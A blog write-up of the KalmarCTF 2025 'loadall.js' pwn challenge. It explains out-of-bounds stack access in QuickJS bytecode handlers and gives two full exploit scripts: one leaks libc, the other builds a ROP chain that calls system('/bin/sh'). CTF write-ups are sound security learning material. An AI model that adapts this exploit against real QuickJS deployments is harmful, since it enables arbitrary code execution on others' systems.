---
title: "kalmar 2025: loadall.js"
description: "My brief solution for the loadall.js challenge"
summary: "kalmar 2025: loadall.js"
categories: ["Writeup"]
tags: ["Pwn"]
#externalUrl: ""
date: 2025-03-10
draft: false
authors:
  - Shin24
---

It's been sometime since I last wrote something on my blog, despite playing lots of CTF, I hardly have time to write. Last sunday, I play kalmar CTF with idek, but because I also play pico so I didn't have time to look on kalmar, before the CTF ends I decided to try some pwn and I was able to solve 1 pwn, this post will be my brief solution for `loadall.js`, a quickJS JavaScript Engine exploit challenge

## Summary

So in this challenge we are given the ability to run QuickJS bytecode directly via a custom function named `loadall`

![image](https://github.com/user-attachments/assets/9a4a3179-3533-4a72-9790-3233ca450095)

The problem is straightforward, when we write JS code, opcodes are emitted by the engine, everything work as expected, but when you are given the power to emit arbitrary bytecodes of your choosing, you may break the way the engine works. With that in mind, I look through the opcode handlers, and pretty quickly found some OOB read/write on stack via `get_loc`, `set_loc`, `get_arg`, `set_arg`, and then you can also incre/decrese the stack pointer `sp` so much that it overwrite all the stack frame.

![image](https://github.com/user-attachments/assets/2afadb21-886b-4750-868a-1aaf6f91f6a1)

so at this point I just have to figure out a way to escalate all of this to control IP.

## QuickJS internal

So each stack entry is a `JSValue`, the `+0` member is the value, the `+8` member is the tag, tag is the indication of what type that `JSValue` is, this is important for the exploitation process, keep it in mind. 

![image](https://github.com/user-attachments/assets/6363c512-90fd-484a-9fa1-df9cd8b26ef6)

## Exploitation

You may think that we have OOB read, so just look for some stack ptr to leak libc/heap or something, well it doesn't work like that. If we want to leak something, we will align the `u` of `JSValue` with that ptr, but then we have to ensure that the tag (a.k.a the next `+8`) is a valid tag, we can search for some places that `u` is a ptr and tag is a null so that QuickJS treat it as a number, but most numbers in QuickJS is 32 bit, so we won't be able to leak the full address, and there're nearly no place that has a valid float64 tag (`0x7`). So the idea is that because we have several OOB, we can use the `set_loc` OOB to overwrite the address of `arg_buf` to an stack address that is not 16-bit aligned, then use it to write the tag to float, and then use the OOB read in `get_loc` to read the value

![image](https://github.com/user-attachments/assets/b1d8cfab-d9ef-40a6-936f-847ab7e6c3ce)

So in above, for example the stack ptr `0x7ffd03c31020` is 16-bit aligned, but hold a pointer that is not 16-bit aligned, we can read from that location and write it to `var_buf`, we can now write to any location that is not 16-bit aligned with `set_arg`. 

```js
OP_push_empty_string = 195;
version = 67
OP_dup = 17;
OP_import = 53;
OP_push_const = 2;
OP_push_i32 = 1;
OP_return = 40;
OP_object = 11;
OP_throw = 47;
OP_array_from = 38;
OP_get_loc = 88;
OP_shr = 163;
OP_set_loc = 90;
OP_push_7 = 190;
OP_get_arg = 91;
OP_set_arg = 93;

libc = loadall((new Uint8Array([67, 9, 18, 117, 115, 101, 32, 115, 116, 114, 105, 112, 18, 99, 104, 101, 99, 107, 70, 108, 97, 103, 2, 95, 6, 109, 97, 112, 24, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 20, 99, 104, 97, 114, 67, 111, 100, 101, 65, 116, 10, 112, 114, 105, 110, 116, 22, 87, 114, 111, 110, 103, 32, 102, 108, 97, 103, 33, 22, 82, 105, 103, 104, 116, 32, 102, 108, 97, 103, 33, 12 /*BC_TAG_FUNCTION_BYTECODE*/, 0, 2, 2, 162, 1, 0 /*arg count*/, 2/*var_count*/, 0/*defined_arg_count*/, 100/*stack_size*/, 0/*closure_var_count*/, 10/*cpool_count*/, 14/*byte_code_len*/, 0/*local_count*/, OP_push_7, OP_set_loc, 126, 0, OP_get_loc, 115, 0, OP_set_loc, 149, 0, OP_get_arg, 11, 0, OP_return, 1/*TAG_NULL*/, 1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,227, 0, 0, 0])).buffer)

buf = new ArrayBuffer(64);
arr = new Float64Array(buf);
arr_2 = new BigInt64Array(buf);
arr[0] = libc
libc = arr_2[0] - 1911904n
print(libc)
```

The rest is simple, just use those primitives to overwrite the return address and ROP

```js
OP_push_empty_string = 195;
version = 67
OP_dup = 17;
OP_import = 53;
OP_push_const = 2;
OP_push_i32 = 1;
OP_return = 40;
OP_object = 11;
OP_throw = 47;
OP_array_from = 38;
OP_get_loc = 88;
OP_shr = 163;
OP_set_loc = 90;
OP_push_7 = 190;
OP_get_arg = 91;
OP_set_arg = 93;

libc = loadall((new Uint8Array([67, 9, 18, 117, 115, 101, 32, 115, 116, 114, 105, 112, 18, 99, 104, 101, 99, 107, 70, 108, 97, 103, 2, 95, 6, 109, 97, 112, 24, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 20, 99, 104, 97, 114, 67, 111, 100, 101, 65, 116, 10, 112, 114, 105, 110, 116, 22, 87, 114, 111, 110, 103, 32, 102, 108, 97, 103, 33, 22, 82, 105, 103, 104, 116, 32, 102, 108, 97, 103, 33, 12 /*BC_TAG_FUNCTION_BYTECODE*/, 0, 2, 2, 162, 1, 0 /*arg count*/, 2/*var_count*/, 0/*defined_arg_count*/, 100/*stack_size*/, 0/*closure_var_count*/, 10/*cpool_count*/, 14/*byte_code_len*/, 0/*local_count*/, OP_push_7, OP_set_loc, 126, 0, OP_get_loc, 115, 0, OP_set_loc, 149, 0, OP_get_arg, 11, 0, OP_return, 1/*TAG_NULL*/, 1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,227, 0, 0, 0])).buffer)

buf = new ArrayBuffer(64);
arr = new Float64Array(buf);
arr_2 = new BigInt64Array(buf);
arr[0] = libc
libc = arr_2[0] - 1911904n
print(libc)
system = libc + 312464n
pop_rdi = libc + 0x00000000000277e5n
sh = libc + 0x196031n

loadall((new Uint8Array([67, 9, 18, 117, 115, 101, 32, 115, 116, 114, 105, 112, 18, 99, 104, 101, 99, 107, 70, 108, 97, 103, 2, 95, 6, 109, 97, 112, 24, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 20, 99, 104, 97, 114, 67, 111, 100, 101, 65, 116, 10, 112, 114, 105, 110, 116, 22, 87, 114, 111, 110, 103, 32, 102, 108, 97, 103, 33, 22, 82, 105, 103, 104, 116, 32, 102, 108, 97, 103, 33, 12 /*BC_TAG_FUNCTION_BYTECODE*/, 0, 2, 2, 162, 1, 0 /*arg count*/, 2/*var_count*/, 0/*defined_arg_count*/, 100/*stack_size*/, 0/*closure_var_count*/, 10/*cpool_count*/, 38/*byte_code_len*/, 0/*local_count*/, OP_get_loc, 20, 0, OP_set_loc, 149, 0, OP_push_const, 0, 0, 0, 0, OP_set_arg, 134, 0, OP_push_const, 1, 0, 0, 0, OP_set_loc, 160, 0, OP_push_const, 3, 0, 0, 0, OP_set_arg, 135, 0, OP_push_const, 2, 0, 0, 0, OP_set_loc, 161, 0, 6/*BC_TAG_FLOAT64*/, parseInt(pop_rdi & 0xffn), parseInt((pop_rdi >> 8n) & 0xffn), parseInt((pop_rdi >> 16n) & 0xffn), parseInt((pop_rdi >> 24n) & 0xffn), parseInt((pop_rdi >> 32n) & 0xffn), parseInt((pop_rdi >> 40n) & 0xffn), parseInt((pop_rdi >> 48n) & 0xffn), parseInt((pop_rdi >> 56n) & 0xffn), 6/*BC_TAG_FLOAT64*/, parseInt(sh & 0xffn), parseInt((sh >> 8n) & 0xffn), parseInt((sh >> 16n) & 0xffn), parseInt((sh >> 24n) & 0xffn), parseInt((sh >> 32n) & 0xffn), parseInt((sh >> 40n) & 0xffn), parseInt((sh >> 48n) & 0xffn), parseInt((sh >> 56n) & 0xffn),6/*BC_TAG_FLOAT64*/, parseInt(system & 0xffn), parseInt((system >> 8n) & 0xffn), parseInt((system >> 16n) & 0xffn), parseInt((system >> 24n) & 0xffn), parseInt((system >> 32n) & 0xffn), parseInt((system >> 40n) & 0xffn), parseInt((system >> 48n) & 0xffn), parseInt((system >> 56n) & 0xffn),6/*BC_TAG_FLOAT64*/, parseInt((pop_rdi + 1n) & 0xffn), parseInt(((pop_rdi + 1n) >> 8n) & 0xffn), parseInt(((pop_rdi + 1n) >> 16n) & 0xffn), parseInt(((pop_rdi + 1n) >> 24n) & 0xffn), parseInt(((pop_rdi + 1n) >> 32n) & 0xffn), parseInt(((pop_rdi + 1n) >> 40n) & 0xffn), parseInt(((pop_rdi + 1n) >> 48n) & 0xffn), parseInt(((pop_rdi + 1n) >> 56n) & 0xffn),1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,1/*TAG_NULL*/,227, 0, 0, 0])).buffer)
//EOF
```

to store that addresses, I stored them in `b->cpool` and load them using `OP_push_const` 

## Final thoughts 

The challenge is not hard, only if we do it this way, according to the challenge's author, the intended solution is more complex

![image](https://github.com/user-attachments/assets/4cab211e-c11a-46b1-a710-9158359030df)

About the heap part, I also tried it that way, by allocating more constant on `b->cpool` you can control where the chunk will land on heap, it maybe more interesting to do a heap exploitation than a stack-based exploit I think. Thank you kalmar for bringing an enjoyable event.
